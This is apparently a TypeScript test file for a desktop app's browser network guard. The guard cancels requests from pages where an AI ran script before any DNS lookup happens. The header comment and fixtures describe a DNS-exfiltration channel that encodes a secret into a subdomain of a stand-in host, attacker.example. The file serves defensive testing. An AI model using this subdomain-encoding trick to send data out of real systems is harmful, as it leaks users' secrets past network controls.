// The in-app browser's network guard decides before any DNS lookup (security review 2026-10-30 "N3", docs/DECISIONS.md
// "Outbound web channels"). It used to look every name up first (is it the office network?) and only then cancel the
// sub-request of a page the AI ran script in. Script can build 'https://' + secret + '.attacker.example' (the team
// server's address check only reads addresses written out in the code), so the lookup alone carried the data to the
// attacker's DNS server, with no card and no limit. Now a request the guard refuses anyway is cancelled without a
// lookup, and a page load the person must allow asks before the lookup. Pure decision + the guard on a fake pane whose
// resolver counts every name.
import { describe, expect, test } from 'bun:test'
import type { OnBeforeRequestListenerDetails } from 'electron'
import { beforeLookupVerdict, type BeforeLookup } from '../../desktop/src/common/net-policy'
import { HostClassifier } from '../../desktop/src/main/pane/classify'
import { netGuardDecision, type GuardPane } from '../../desktop/src/main/pane/net-guard'
import { SitePermissions, type PermissionDecision } from '../../desktop/src/common/site-permissions'

const base: BeforeLookup = { mainFrame: false, hasOwner: true, driving: false, anyScripted: true, scripted: true, sameSiteAsTop: false, siteAllowed: false, needsDns: true, officeAllowed: false, topOfficeAllowed: false }

describe('beforeLookupVerdict', () => {
  test('a scripted page\'s request to another site nobody allowed: cancelled without a lookup', () => {
    expect(beforeLookupVerdict(base)).toBe('cancel')
    expect(beforeLookupVerdict({ ...base, hasOwner: false, scripted: false })).toBe('cancel')
  })
  test('allowed or same-site requests, office pages and names that need no DNS: decided as before', () => {
    for (const r of [{ siteAllowed: true }, { officeAllowed: true }, { sameSiteAsTop: true }, { topOfficeAllowed: true }, { needsDns: false }, { scripted: false }, { hasOwner: false, anyScripted: false, scripted: false }])
      expect(beforeLookupVerdict({ ...base, ...r }), JSON.stringify(r)).toBe('lookup')
  })
  test('a page load the person must allow: asked before the lookup', () => {
    expect(beforeLookupVerdict({ ...base, mainFrame: true })).toBe('ask')
    expect(beforeLookupVerdict({ ...base, mainFrame: true, anyScripted: false, scripted: false, driving: true })).toBe('ask')
    expect(beforeLookupVerdict({ ...base, mainFrame: true, anyScripted: false, scripted: false })).toBe('lookup') // the person browsing
  })
})

/** A pane with one tab on shop.example where the AI ran script; the resolver records every name. */
function fakePane(o: { scripted?: boolean; driving?: boolean; answer?: PermissionDecision; addrs?: string[]; perms?: SitePermissions; typed?: string[] } = {}) {
  const resolved: string[] = []
  const order: string[] = []
  const asked: { scope: string; host: string }[] = []
  const activity: { kind: string; host: string }[] = []
  const classifier = new HostClassifier(new Set(), new Set(), async (h) => { resolved.push(h); order.push(`dns ${h}`); return o.addrs ?? ['93.184.215.14'] })
  const perms = o.perms ?? new SitePermissions()
  const tab = { scripted: o.scripted ?? true }
  const pane = {
    classifier, perms, userHosts: new Set<string>(o.typed ?? []), officeLetThrough: new Set<string>(),
    isDriving: o.driving ?? false, anyScripted: o.scripted ?? true,
    currentCall: () => undefined,
    tabForWebContents: () => ({ tab, topUrl: 'https://shop.example/cart' }),
    scriptedFor: () => o.scripted ?? true,
    forbiddenNow: () => null,
    forbidden: async (url: string) => ((await classifier.isLoopback(new URL(url).hostname)) ? { reason: 'loopback', host: new URL(url).host } : null),
    ask: async (req: { scope: string; host: string }) => { asked.push({ scope: req.scope, host: req.host }); order.push(`ask ${req.scope} ${req.host}`); return o.answer ?? 'deny' },
    grant: (scopes: string[], host: string, d: PermissionDecision) => { for (const s of scopes) perms.grant(s as 'site', host, d) },
    activity: (kind: string, host: string) => { activity.push({ kind, host }) },
    session: { resolveProxy: async () => 'DIRECT', resolveHost: async () => ({ endpoints: [] }) },
  } as unknown as GuardPane
  return { pane, decide: netGuardDecision(pane), resolved, order, asked, activity }
}
const req = (url: string, resourceType = 'image'): OnBeforeRequestListenerDetails => ({ id: 1, url, method: 'GET', resourceType, webContentsId: 7, timestamp: 0, referrer: '', uploadData: [] } as unknown as OnBeforeRequestListenerDetails)

describe('the guard on a page the AI scripted', () => {
  test('an image to an AI-made name on another site: cancelled, the name never looked up', async () => {
    const g = fakePane()
    const host = 'c2fsyxj5ltk4nzy1ndmy.attacker.example'
    expect(await g.decide(req(`https://${host}/p.gif`))).toEqual({ cancel: true })
    expect(await g.decide(req(`https://${host}/b`, 'xhr'))).toEqual({ cancel: true })
    expect(g.resolved).toEqual([])
    expect(g.activity).toEqual([{ kind: 'offsite', host }])
  })

  test('on a public site the person typed in the address bar: still cancelled without looking the name up', async () => {
    // a typed host counts as "approved" for the office rules too; only a real office page lets its office requests through
    const g = fakePane({ typed: ['shop.example'] })
    const host = 'c2fsyxj5ltk4nzy1ndmy.attacker.example'
    expect(await g.decide(req(`https://${host}/p.gif`))).toEqual({ cancel: true })
    expect(g.resolved).not.toContain(host)
  })

  test('its own site still loads (looked up as before)', async () => {
    const g = fakePane()
    expect(await g.decide(req('https://cdn.shop.example/app.js', 'script'))).toEqual({})
    expect([...new Set(g.resolved)]).toEqual(['cdn.shop.example'])
  })

  test('a site the person allowed: looked up and loaded', async () => {
    const perms = new SitePermissions({ always: ['news.example'] })
    const g = fakePane({ perms })
    expect(await g.decide(req('https://news.example/a.png'))).toEqual({})
    expect([...new Set(g.resolved)]).toEqual(['news.example'])
  })

  test('a page load to an AI-made name: the site card first; declined, never looked up', async () => {
    const g = fakePane({ answer: 'deny' })
    const host = 'zgf0ys1ozxjl.attacker.example'
    expect(await g.decide(req(`https://${host}/`, 'mainFrame'))).toEqual({ cancel: true })
    expect(g.asked).toEqual([{ scope: 'site', host }])
    expect(g.resolved).toEqual([])
  })

  test('allowed once: looked up after the card; an office address then asks its own card', async () => {
    const pub = fakePane({ answer: 'once' })
    expect(await pub.decide(req('https://docs.example/', 'mainFrame'))).toEqual({})
    expect([...new Set(pub.order)]).toEqual(['ask site docs.example', 'dns docs.example'])
    const office = fakePane({ answer: 'once', addrs: ['10.1.2.3'] })
    expect(await office.decide(req('https://wiki.corp-office.example/', 'mainFrame'))).toEqual({})
    expect([...new Set(office.order)]).toEqual(['ask site wiki.corp-office.example', 'dns wiki.corp-office.example', 'ask private wiki.corp-office.example'])
  })

  test('a page the AI did not script: the person browsing is decided as before (lookup first, no card)', async () => {
    const g = fakePane({ scripted: false })
    expect(await g.decide(req('https://other.example/x.png'))).toEqual({})
    expect(await g.decide(req('https://other.example/', 'mainFrame'))).toEqual({})
    expect(g.asked).toEqual([])
    expect(g.resolved.length).toBeGreaterThan(0)
  })
})
